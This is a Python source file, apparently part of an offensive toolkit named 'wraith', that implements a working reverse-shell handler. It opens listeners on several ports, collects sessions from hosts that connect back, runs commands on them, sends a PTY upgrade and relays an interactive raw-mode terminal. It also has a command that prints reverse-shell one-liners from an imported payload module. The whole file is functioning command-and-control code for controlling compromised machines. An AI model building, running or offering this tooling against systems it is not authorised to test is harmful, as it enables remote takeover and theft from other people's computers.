"""Interactive reverse-shell handler: multi-listener + post-exploitation console."""

from __future__ import annotations

import asyncio
import os
import sys

from wraith.shell import payloads
from wraith.shell.session import SessionManager

HELP = """commands:
  sessions                 list connected sessions
  interact <id>            attach to a session (detach with Ctrl-])
  cmd <id> <command>       run a single command and print the output
  upgrade <id>             upgrade the shell to a full PTY (python pty.spawn)
  payloads [lhost] [lport] print reverse-shell one-liners
  kill <id>                drop a session
  help                     show this help
  exit                     quit
"""


class ShellServer:
    def __init__(self, ports: list[int], lhost: str, console):
        self.ports = ports
        self.lhost = lhost
        self.console = console
        self.mgr = SessionManager()
        self._servers: list[asyncio.AbstractServer] = []

    async def _on_conn(self, reader, writer) -> None:
        sess = self.mgr.add(reader, writer)
        sess.start()
        host, port = sess.peer[0], sess.peer[1]
        self.console.good(f"session {sess.id} opened — {host}:{port}")

    async def _start_listeners(self) -> None:
        for port in self.ports:
            try:
                server = await asyncio.start_server(self._on_conn, "0.0.0.0", port)
            except OSError as exc:
                self.console.bad(f"cannot bind :{port} — {exc}")
                continue
            self._servers.append(server)
            self.console.info(f"listening on 0.0.0.0:{port}")

    async def run(self) -> None:
        await self._start_listeners()
        if not self._servers:
            self.console.bad("no listeners; aborting")
            return
        self.console.info(f"lhost for payloads: {self.lhost}  (type 'help')")
        await self._repl()
        for server in self._servers:
            server.close()

    # ------------------------------------------------------------- REPL
    async def _repl(self) -> None:
        loop = asyncio.get_event_loop()
        while True:
            try:
                line = await loop.run_in_executor(None, input, "wraith(shell)> ")
            except (EOFError, KeyboardInterrupt):
                break
            line = line.strip()
            if not line:
                continue
            parts = line.split(maxsplit=1)
            cmd = parts[0].lower()
            arg = parts[1] if len(parts) > 1 else ""

            if cmd in ("exit", "quit"):
                break
            elif cmd in ("help", "?"):
                self.console.plain(HELP)
            elif cmd in ("sessions", "ls"):
                self._list_sessions()
            elif cmd == "payloads":
                self._show_payloads(arg)
            elif cmd in ("cmd", "run"):
                await self._run_cmd(arg)
            elif cmd == "upgrade":
                await self._upgrade(arg)
            elif cmd == "interact":
                await self._interact(arg)
            elif cmd == "kill":
                self._kill(arg)
            else:
                self.console.warn(f"unknown command: {cmd} (type 'help')")

    def _list_sessions(self) -> None:
        sessions = self.mgr.all()
        if not sessions:
            self.console.warn("no sessions yet")
            return
        for s in sessions:
            state = "alive" if s.alive else "dead"
            self.console.plain(f"  [{s.id}] {s.peer[0]}:{s.peer[1]}  {state}  up {s.age}")

    def _show_payloads(self, arg: str) -> None:
        bits = arg.split()
        lhost = bits[0] if len(bits) >= 1 else self.lhost
        lport = int(bits[1]) if len(bits) >= 2 else self.ports[0]
        self.console.info(f"reverse shells for {lhost}:{lport}")
        for name, payload in payloads.generate(lhost, lport).items():
            self.console.plain(f"\n  # {name}\n  {payload}")
        self.console.plain("")

    def _resolve(self, arg: str):
        try:
            sess = self.mgr.get(int(arg.split()[0]))
        except (ValueError, IndexError):
            self.console.warn("usage needs a numeric session id")
            return None
        if not sess:
            self.console.warn("no such session")
            return None
        return sess

    async def _run_cmd(self, arg: str) -> None:
        bits = arg.split(maxsplit=1)
        if len(bits) < 2:
            self.console.warn("usage: cmd <id> <command>")
            return
        sess = self._resolve(bits[0])
        if not sess:
            return
        await sess.send(bits[1].encode() + b"\n")
        out = await sess.collect(timeout=1.2)
        sys.stdout.buffer.write(out)
        sys.stdout.buffer.flush()
        self.console.plain("")

    async def _upgrade(self, arg: str) -> None:
        sess = self._resolve(arg)
        if not sess:
            return
        await sess.send(payloads.TTY_UPGRADE.encode() + b"\n")
        self.console.good("sent PTY upgrade — interact and run: export TERM=xterm")

    def _kill(self, arg: str) -> None:
        sess = self._resolve(arg)
        if not sess:
            return
        self.mgr.remove(sess.id)
        self.console.good(f"session {sess.id} closed")

    async def _interact(self, arg: str) -> None:
        sess = self._resolve(arg)
        if not sess:
            return
        if not sys.stdin.isatty():
            self.console.warn("interact needs a real TTY — use 'cmd <id> ...' here")
            return

        import termios
        import tty

        loop = asyncio.get_event_loop()
        fd = sys.stdin.fileno()
        old = termios.tcgetattr(fd)
        detached = asyncio.Event()

        def on_stdin() -> None:
            try:
                data = os.read(fd, 4096)
            except OSError:
                detached.set()
                return
            if b"\x1d" in data:  # Ctrl-]
                detached.set()
                return
            asyncio.ensure_future(sess.send(data))

        self.console.info(f"interacting with session {sess.id} — detach: Ctrl-]")
        try:
            # Raw mode so our terminal stops cooking input: every keystroke
            # (Ctrl-C, tab, arrows) goes straight to the remote shell instead of
            # being handled locally. We restore the saved settings in `finally`.
            tty.setraw(fd)
            sess.mirror_on()
            loop.add_reader(fd, on_stdin)
            await detached.wait()
        finally:
            loop.remove_reader(fd)
            sess.mirror_off()
            termios.tcsetattr(fd, termios.TCSADRAIN, old)
        self.console.plain("")
